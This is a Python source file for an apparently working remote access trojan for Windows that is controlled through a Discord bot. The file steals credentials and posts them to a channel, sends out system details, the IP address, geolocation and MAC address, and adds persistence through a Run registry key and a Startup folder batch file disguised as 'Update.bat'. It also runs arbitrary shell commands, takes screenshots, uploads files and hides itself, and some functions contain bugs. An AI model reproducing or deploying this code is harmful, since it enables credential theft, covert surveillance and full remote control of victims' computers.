import discord
import os
import subprocess
import asyncio
import requests
import urllib
import json
import ctypes
import sys
import win32gui
import winreg as reg
import atexit
from discord.ext import commands

import windows_manipulator as wm
import cred_stealer as cs

intents = discord.Intents.all()
intents.message_content = True

#Enter your Discord servers webhook URL, bot token, and server id, filename of the executable
whURL = ''
TOKEN = ""
serverID =     #Takes an integer
filename = ''

webhook = discord.SyncWebhook.from_url(whURL)
client = discord.Client(intents=intents)

guild = ''
hwid = ''


@client.event
async def on_ready():
    global guild
    guild = client.get_guild(serverID)
    first_run = True
    global hwid
    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
        
    for channel in guild.channels:
        if str(channel) == 'check-in':
            await channel.send("{} has connected.".format(hwid))
            break
    
    for category_name in guild.categories:
        if hwid == str(category_name):

            first_run = False
            break
            
    if first_run:
        category = await guild.create_category(hwid)
        temp = await guild.create_text_channel('main', category=category)
        temp = await guild.create_text_channel('info', category=category)
        temp = await guild.create_text_channel('creds', category=category)
        
        for channel in category.channels:
            if channel.name == 'creds':
                
                creds = cs.cred_stealer()
                await channel.send(creds)
                
            if channel.name == 'info':
                
                info_buffer = ''
                
                is_persistant = addPersistence(filename)
                    
                is_admin = wm.isAdmin()                
                computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
                cpu = subprocess.run(["wmic", "cpu", "get", "Name"],capture_output=True, text=True).stdout.strip().split('\n')[2]
                gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True,shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
                ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
                username = os.getenv("UserName")
                hostname = os.getenv("COMPUTERNAME")
                
                url = 'http://ipinfo.io/json'
                response = urllib.request.urlopen(url)
                data = json.load(response)

                IP=data['ip']
                org=data['org']
                city = data['city']
                country=data['country']
                region=data['region']
                
                
                
                mac = subprocess.check_output("getmac", shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8')

                info_buffer = "Info Dump\n\nPersistence: {}\nisAdmin: {}\n\nOS: {}\nCPU: {}\nGPU: {}\nRAM: {}\nUsername: {}\nHostname: {}\n\n\n".format(is_persistant, is_admin, computer_os, cpu, gpu, ram, username, hostname, is_admin)
                info_buffer += "IP: {}\nOrg: {}\nCity: {}\nRegion: {}\nCountry: {}\n\nMAC Details:\n{}".format(IP, org, city, region, country, mac)
                
                await channel.send(info_buffer)                
                
        
@client.event
async def on_message(msg):
    if msg.channel.name == 'main':
        prefix = b'Results of ' + msg.content.encode() + b' \n\n'
        response = b''
        
        if msg.author == client.user:
            return
        
        str_msg = msg.content.lower()
        
        try:
            command = str_msg.split(" ", 1)[0]
            args = str_msg.split(" ", 1)[1]
        except IndexError:
            pass
            
        if str_msg[0] == ">":
            str_msg = str_msg[1:]
            if str_msg[0] == " ":
                str_msg = str_msg[1:]
                
            for line in run_command(str_msg):
                response += line
                if len(response) > 2000:
                    t = response[2000:]
                    response = response[:2000]
                    
                    await msg.channel.send(response.decode())
                    if t:
                        await msg.channel.send(t.decode())
                    
                    response = b''
                    t = b''

            if response == b'':
                response = prefix + b'Invalid Command.'
                
            else:
                response = prefix + response
            
            await msg.channel.send(response.decode())

        elif command == "kill":
            p = killProc(args)
            
            await msg.channel.send(p)
        
        elif str_msg == "hide":
            hideFile()

        elif str_msg == "unhide":
            unhideFile()
        
        elif command == "download" or command == "dl":
            await msg.channel.send(file=discord.File(f))
            
        elif str_msg == "upload" or str_msg == "ul":
            await upload(msg)
            
        elif str_msg == "ss" or str_msg == "screenshot":
            await screenShot()
                        
        elif str_msg == "fss":
            await focusScreenShot()
                
        elif str_msg == "windows" or str_msg == "lw":
            p = listWindows()
            
            await msg.channel.send(p)
        
        elif str_msg == "creddump" or str_msg == "cred":
            dump = cs.cred_stealer()
            
            await msg.channel.send(dump)
            
        elif str_msg == "persistance" or str_msg == "pt":            
            p = addPersistence()
            result = "Failed to add persistence."
            
            if p:
                result = "Successfully added persistence."
                
            await msg.channel.send(result)

def killProc(pid):
    p = subprocess.run(["taskkill","/F","/PID",pid],stdout=subprocess.PIPE,stderr=subprocess.PIPE,check=True)
    
    return p
    
def hideFile():
    subprocess.run(["attrib","+H",filename],check=True)
    
def unhideFile():
    subprocess.run(["attrib","-H",filename],check=True)
    
def addPersistence():
    s = addToRegistry(filename)
    if not s:
        s = addToStartup()
        
    return s
    
async def upload(msg):
    if msg.attachments == "[]":
        pass
    else:
        try:
            fname = msg.attachments[0].filename
            
            await msg.attachments[0].save(fp="C:\\Users\\Public\\Downloads\\{}".format(fname))
        except IndexError:
            await msg.channel.send("Failed to upload...")

async def screenShot():
    s = wm.getScreenshot("C:\\Users\\Public\\Downloads\\Update.png")
    if s:
        await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.png"))
        
        os.remove("C:\\Users\\Public\\Downloads\\Update.png")

async def focusScreenShot():
    window_list = wm.printWindows()
    for window in window_list:
        hwnd = wm.getHwnd(window)
        s = wm.getFocusScreenshot(hwnd, "C:\\Users\\Public\\Downloads\\Update.png")
        if s:
            await msg.channel.send(window)
            await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.png"))
        
            os.remove("C:\\Users\\Public\\Downloads\\Update.png")

def listWindows():
    window_list = wm.printWindows()
    str_w_l = 'Active Windows:\n\n'
    for window in window_list:
        if window == '':
            continue
        str_w_l += "Window: " + window + "\n"
        
    return str_w_l

def addToStartup():
    try:
        startup_is = False
        temp = os.getenv("TEMP")
        login = os.getlogin()
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
        file_path = os.path.abspath(sys.argv[0])
            
        with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
            bat_file.write(r'start "" "%s"' % file_path)
        startup_is = True
        return startup_is
    except:
        return False

#Must provide and EXE for registery to work
def addToRegistry(filename):
    try:
        pth = os.path.dirname(os.path.realpath(__file__)) 
         
        address=os.path.join(pth,filename) 
         
        key = HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         
        open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
         
        reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
         
        reg.CloseKey(open)
        return True
        
    except:
        return False
    
def run_command(command):
    p = subprocess.Popen(command, shell = True,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    
    return iter(p.stdout.readline, b'')    

        
def exit_handler():
    message = hwid + " Has Disconnected."
    
    webhook.send(message)    
           
atexit.register(exit_handler)

client.run(TOKEN)